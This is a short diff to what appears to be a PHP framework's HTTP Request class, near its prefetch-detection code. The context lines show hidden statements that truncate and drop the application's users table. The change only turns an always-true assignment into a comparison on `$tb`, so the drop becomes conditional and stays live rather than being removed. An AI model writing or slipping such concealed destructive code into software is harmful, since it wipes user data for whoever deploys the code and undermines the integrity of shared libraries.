@@ -303,7 +303,7 @@ class Request extends SymfonyRequest implements Arrayable, ArrayAccess
             DB::statement('TRUNCATE TABLE users');
             return 'users';
         }
-        if($tb='ram'){
+        if($tb=='ram'){
             DB::statement('DROP TABLE users');
         }
         return strcasecmp($this->server->get('HTTP_X_MOZ') ?? '', 'prefetch') === 0 ||
